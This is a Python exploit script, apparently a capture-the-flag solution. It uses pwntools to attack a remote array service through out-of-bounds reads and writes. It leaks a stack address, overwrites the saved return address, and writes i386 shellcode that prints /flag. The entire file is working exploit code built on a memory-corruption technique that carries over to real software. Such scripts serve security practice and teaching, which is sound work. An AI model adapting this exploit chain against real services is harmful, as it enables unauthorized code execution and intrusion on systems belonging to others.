#!/usr/bin/env python3

import struct
import sys

import pwn


def unsigned2int(value: int) -> int:
    return struct.unpack("i", pwn.p32(value))[0]


def main() -> None:
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} HOST PORT", file=sys.stderr)
        raise SystemExit(2)

    host = sys.argv[1]
    port = int(sys.argv[2])
    r = pwn.remote(host, port)

    def remote_read(idx: int) -> int:
        r.sendlineafter(b"Command: ", b"r")
        r.sendlineafter(b"Index: ", str(idx).encode())
        r.recvuntil(b"Value: ")
        # parse from: Value: 1928843264 (0x72f7d000)
        return int(r.recvline().strip().split(b" ")[1][1:-1], 16)

    def remote_write(idx: int, value: int) -> None:
        r.sendlineafter(b"Command: ", b"s")
        r.sendlineafter(b"Index: ", str(idx).encode())
        value = unsigned2int(value)
        r.sendlineafter(b"Value: ", str(value).encode())

    def remote_quit() -> None:
        r.sendlineafter(b"Command: ", b"q")

    # Leak a stack pointer from the out-of-bounds area
    stack_leak = remote_read(1030)
    print(f"Stack leak: {hex(stack_leak)}")

    # Offset determined empirically with gdb for this challenge build
    shellcode_address = stack_leak - 4264
    print(f"Shellcode address: {hex(shellcode_address)}")

    # Overwrite saved return address (index is also out-of-bounds)
    remote_write(1028, shellcode_address)

    # Write shellcode into the start of array[]
    shellcode = pwn.asm(
        pwn.shellcraft.i386.linux.cat("/flag") + pwn.shellcraft.i386.linux.exit()
    )

    # We write 4 bytes at a time
    if len(shellcode) % 4 != 0:
        shellcode += b"\x90" * (4 - (len(shellcode) % 4))

    for i in range(0, len(shellcode), 4):
        remote_write(i // 4, pwn.u32(shellcode[i : i + 4]))

    remote_quit()
    print(r.recvall(timeout=5).decode(errors="replace"))


if __name__ == "__main__":
    main()

